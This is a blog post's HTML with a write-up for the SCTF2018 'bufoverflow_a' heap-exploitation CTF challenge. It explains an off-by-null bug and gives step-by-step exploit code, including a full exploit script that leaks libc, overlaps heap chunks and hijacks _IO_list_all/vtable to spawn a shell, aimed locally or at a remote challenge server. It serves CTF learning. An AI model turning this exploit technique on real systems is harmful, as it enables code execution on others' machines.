@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>SCTF2018 bufoverflow_a WriteUp | F0r_1st&#39;s Blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="" />
+  
+
+  <meta name="description" content="AnalyseA note problem, which has standard interaction : 1234561. Alloc2. Delete3. Fill4. Show5. Exit&amp;gt;&amp;gt; Alloc : 123456789101112if ( size &amp;lt;= 0x7F || size &amp;gt; 0x1000 )    return puts(&quot;Invalid s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SCTF2018 bufoverflow_a WriteUp">
+<meta property="og:url" content="http://yoursite.com/2018/06/21/SCTF2018-bufoverflow-a-WriteUp/index.html">
+<meta property="og:site_name" content="F0r_1st&#39;s Blog">
+<meta property="og:description" content="AnalyseA note problem, which has standard interaction : 1234561. Alloc2. Delete3. Fill4. Show5. Exit&amp;gt;&amp;gt; Alloc : 123456789101112if ( size &amp;lt;= 0x7F || size &amp;gt; 0x1000 )    return puts(&quot;Invalid s">
+<meta property="og:updated_time" content="2018-06-21T07:44:56.404Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SCTF2018 bufoverflow_a WriteUp">
+<meta name="twitter:description" content="AnalyseA note problem, which has standard interaction : 1234561. Alloc2. Delete3. Fill4. Show5. Exit&amp;gt;&amp;gt; Alloc : 123456789101112if ( size &amp;lt;= 0x7F || size &amp;gt; 0x1000 )    return puts(&quot;Invalid s">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile"></span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text"></span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            Blog
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            Cago
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            Link
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            Srch
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts List</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Analyse"><span class="toc-text">Analyse</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Leak"><span class="toc-text">Leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Heap-overlap"><span class="toc-text">Heap overlap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsorted-bin-attack-amp-bypass-vtable"><span class="toc-text">Unsorted bin attack &amp; bypass vtable</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-SCTF2018-bufoverflow-a-WriteUp" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">SCTF2018 bufoverflow_a WriteUp</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.06.21</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>F0r_1st</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a>
+  </span>
+
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="https://Kirito0.github.io/2018/06/21/SCTF2018-bufoverflow-a-WriteUp/#disqus_thread"></a>
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h1><p>A note problem, which has standard interaction :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Alloc</span><br><span class="line"><span class="number">2.</span> Delete</span><br><span class="line"><span class="number">3.</span> Fill</span><br><span class="line"><span class="number">4.</span> Show</span><br><span class="line"><span class="number">5.</span> Exit</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>
+<p>Alloc :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( size &lt;= <span class="number">0x7F</span> || size &gt; <span class="number">0x1000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line"><span class="keyword">if</span> ( count &gt; <span class="number">1u</span> )</span><br><span class="line">&#123;</span><br><span class="line">    mallopt(<span class="number">-6</span>, <span class="number">0xCC</span>);</span><br><span class="line">    ptr = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    mallopt(<span class="number">-6</span>, <span class="number">0</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Can’t fastbin. When chunk count &gt; 1, it uses calloc to allocate. Calloc will set chunk memory to 0 when called.</p>
+<p>Delete :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span> &amp;&amp; global_array[<span class="number">2</span> * idx + <span class="number">1</span>] )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)global_array[<span class="number">2</span> * idx + <span class="number">1</span>]);</span><br><span class="line">    chunk_ptr[<span class="number">1</span>] = <span class="number">0L</span>L;                         <span class="comment">// chunk_addr</span></span><br><span class="line">    global_array[<span class="number">2</span> * idx + <span class="number">1</span>] = <span class="number">0L</span>L;            <span class="comment">// chunk_addr</span></span><br><span class="line">    global_array[<span class="number">2</span> * idx] = <span class="number">0L</span>L;                <span class="comment">// size</span></span><br><span class="line">    v0 = &amp;count;</span><br><span class="line">    --count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>No uaf or double free.</p>
+<p>Fill :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">v1 = chunk_ptr;</span><br><span class="line">result = chunk_ptr[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> ( result )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">    result = input_data(v1[<span class="number">1</span>], *v1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">-------------------------------------</span><br><span class="line">input_data(__int64 dst, __int64 len):</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">          perror(<span class="string">"Read faild!\n"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( buf == <span class="string">'\n'</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      *(_BYTE *)(dst + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">*(_BYTE *)(i + dst) = <span class="number">0</span>;	<span class="comment">//vulnerability</span></span><br></pre></td></tr></table></figure>
+<p>In the fill function, we can get set dst[len+1] = 0 if we input data, the length of which is len ( off-by-null ).</p>
+<p>Show :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf = *src;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len &amp;&amp; buf; buf = src[i] )</span><br><span class="line">&#123;</span><br><span class="line">    write(<span class="number">1</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    ++i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Just write the content of note.</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h2 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h2><p>Since it uses calloc when count &gt; 2, we can use unsorted bin to leak main_arena and finally get the address of libc.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x100</span>)	<span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x100</span>)	<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0x100</span>)	<span class="comment">#0</span></span><br><span class="line">show()</span><br></pre></td></tr></table></figure>
+<h2 id="Heap-overlap"><a href="#Heap-overlap" class="headerlink" title="Heap overlap"></a>Heap overlap</h2><p>We get off-by-null in fill function, so we can create heap overlap. Fake the size of freed small bin.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x108</span>)    <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x300</span>)    <span class="comment">#3</span></span><br><span class="line">fill(<span class="string">'\x00'</span>*<span class="number">0x2f0</span>+p64(<span class="number">0x300</span>)+p64(<span class="number">0</span>))</span><br><span class="line">alloc(<span class="number">0x108</span>)    <span class="comment">#4</span></span><br><span class="line">alloc(<span class="number">0x108</span>)    <span class="comment">#5</span></span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<p>First we create 4 chunks, and chunk 3 has the biggest size of 0x310 ( include head ). Then set the foot of chunk 3 to bypass the check and free it.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">0x108</span>)    <span class="comment">#2</span></span><br><span class="line">fill(<span class="string">'\x00'</span>*<span class="number">0x108</span>)	<span class="comment">#trigger off-by-null</span></span><br><span class="line">alloc(<span class="number">0x108</span>)    <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x88</span>)     <span class="comment">#6</span></span><br><span class="line">alloc(<span class="number">0x108</span>)     <span class="comment">#7</span></span><br></pre></td></tr></table></figure>
+<p>We can only edit the latest chunk we allocated, so we need to free chunk 2 and allocate it. When we fill chunk 2, we trigger off-by-null and set the size of chunk 3 from 0x311 to 0x300. Then we allocate chunk 3, 6 and 7 with the fake size of 0x300.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
+<p>Then free chunk 3, 4 and 7. In normal, chunk 4 saves the prev_size of 0x310. When we free chunk 4, it uses the prev_size to find the previous chunk and gets chunk 3. In that case, If chunk 3 is freed, chunk 4 will merge chunk 3 and finally got a big unsorted chunk ( 0x110 + 0x310 = 0x420 ). Lastly, when we free chunk 7,  we get a small unsorted bin in a big unsorted bin.</p>
+<h2 id="Unsorted-bin-attack-amp-bypass-vtable"><a href="#Unsorted-bin-attack-amp-bypass-vtable" class="headerlink" title="Unsorted bin attack &amp; bypass vtable"></a>Unsorted bin attack &amp; bypass vtable</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x410</span>)    <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0xddaa</span>) + p64(io_list_all - <span class="number">0x10</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x1</span>)+p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64( (binsh<span class="number">-0x64</span>)/<span class="number">2</span> )</span><br><span class="line">fake_chunk=fake_chunk.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk+=p64(system+<span class="number">0x420</span>)</span><br><span class="line">fake_chunk=fake_chunk.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = fake_chunk</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(vtable_addr)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">fill(<span class="string">'\x00'</span>*<span class="number">0x190</span>+payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">512</span>)</span><br></pre></td></tr></table></figure>
+<p>If we allocate a chunk, the length of which is 0x420, we can overwrite the small unsorted bin. Since the version of libc is 2.24 so we need to attack IO &amp; bypass vtable just like <a href="https://bbs.pediy.com/thread-222735.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222735.htm</a>.</p>
+<p>The whole exp ( using <a href="https://github.com/matrix1001/welpwn" target="_blank" rel="noopener">https://github.com/matrix1001/welpwn</a> ):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#-----function for quick script-----#</span></span><br><span class="line">    s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is a int</span></span><br><span class="line">    sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">    st      = <span class="keyword">lambda</span> delim,data         :ctx.sendthen(str(delim), str(data)) </span><br><span class="line">    sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">    sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">    sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlinethen(str(delim), str(data)) </span><br><span class="line">    r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">    ru      = <span class="keyword">lambda</span> delims, drop=<span class="keyword">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">    irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">    </span><br><span class="line">    rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">    leak    = <span class="keyword">lambda</span> address, count=<span class="number">0</span>   :ctx.leak(address, count)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(gdbscript=<span class="string">''</span>, *args, **kwargs)</span>:</span></span><br><span class="line">        gdbscript = sym_ctx.gdbscript + gdbscript</span><br><span class="line">        <span class="keyword">return</span> ctx.debug(gdbscript, *args, **kwargs)</span><br><span class="line">    </span><br><span class="line">    uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">    uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(asize)</span>:</span></span><br><span class="line">        ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">        sl(<span class="string">'1'</span>)</span><br><span class="line">        ru(<span class="string">'Size: '</span>)</span><br><span class="line">        sl(str(asize))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">        sl(<span class="string">'2'</span>)</span><br><span class="line">        ru(<span class="string">'Index: '</span>)</span><br><span class="line">        sl(str(idx))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">        ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">        sl(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(data)</span>:</span></span><br><span class="line">        ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">        sl(<span class="string">'3'</span>)</span><br><span class="line">        ru(<span class="string">'Content: '</span>)</span><br><span class="line">        s(data)</span><br><span class="line"></span><br><span class="line">    debugg = <span class="number">1</span></span><br><span class="line">    logg = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    ctx.binary = <span class="string">'./bufoverflow_a'</span></span><br><span class="line">    <span class="keyword">if</span> debugg:</span><br><span class="line">        ctx.libc = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">        rs()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ctx.libc = <span class="string">'./libc.so.6'</span></span><br><span class="line">        rs(remote_addr = (<span class="string">'116.62.152.176'</span>,<span class="number">20001</span>))</span><br><span class="line">    <span class="keyword">if</span> logg:</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">    alloc(<span class="number">0x100</span>)</span><br><span class="line">    alloc(<span class="number">0x100</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    alloc(<span class="number">0x100</span>)</span><br><span class="line">    show()</span><br><span class="line">    tmp = uu64(ru(<span class="string">'\n'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> debugg:</span><br><span class="line">        libc_base = tmp - <span class="number">0x3c4b78</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc_base = tmp - <span class="number">0x399b58</span></span><br><span class="line">    <span class="comment">#print hex(tmp - ctx.bases['libc'])</span></span><br><span class="line">    log.success(<span class="string">"libc_base = %s"</span>%hex(libc_base))</span><br><span class="line">    <span class="keyword">if</span> debugg:</span><br><span class="line">        vtable_addr = libc_base + <span class="number">0x3c37a0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        vtable_addr = libc_base + <span class="number">0x396500</span></span><br><span class="line">    system = libc_base + ctx.libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh = libc_base + next(ctx.libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">    io_list_all = libc_base + ctx.libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x108</span>)    <span class="comment">#2</span></span><br><span class="line">    alloc(<span class="number">0x300</span>)    <span class="comment">#3</span></span><br><span class="line">    fill(<span class="string">'\x00'</span>*<span class="number">0x2f0</span>+p64(<span class="number">0x300</span>)+p64(<span class="number">0</span>))</span><br><span class="line">    alloc(<span class="number">0x108</span>)    <span class="comment">#4</span></span><br><span class="line">    alloc(<span class="number">0x108</span>)    <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    alloc(<span class="number">0x108</span>)    <span class="comment">#2</span></span><br><span class="line">    fill(<span class="string">'\x00'</span>*<span class="number">0x108</span>)</span><br><span class="line">    alloc(<span class="number">0x108</span>)    <span class="comment">#3</span></span><br><span class="line">    alloc(<span class="number">0x88</span>)     <span class="comment">#6</span></span><br><span class="line">    alloc(<span class="number">0x108</span>)     <span class="comment">#7</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    </span><br><span class="line">    alloc(<span class="number">0x410</span>)    <span class="comment">#3</span></span><br><span class="line">    </span><br><span class="line">    fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">    fake_chunk += p64(<span class="number">0xddaa</span>) + p64(io_list_all - <span class="number">0x10</span>)</span><br><span class="line">    fake_chunk += p64(<span class="number">0x1</span>)+p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64( (binsh<span class="number">-0x64</span>)/<span class="number">2</span> )</span><br><span class="line">    fake_chunk=fake_chunk.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    fake_chunk+=p64(system+<span class="number">0x420</span>)</span><br><span class="line">    fake_chunk=fake_chunk.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    fake_chunk+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    payload = fake_chunk</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(vtable_addr)</span><br><span class="line">    payload += p64(system)</span><br><span class="line">    payload += p64(<span class="number">2</span>)</span><br><span class="line">    payload += p64(<span class="number">3</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">    payload += p64(system)</span><br><span class="line">    </span><br><span class="line">    fill(<span class="string">'\x00'</span>*<span class="number">0x190</span>+payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">512</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#dbg()</span></span><br><span class="line">    irt()</span><br></pre></td></tr></table></figure>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/04/02/QWB2018-solid-core-Write-Up/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">Close</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              Blog
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              Cago
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              Link
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              Srch
+            </a>
+          </li>
+        
+      </ul>
+
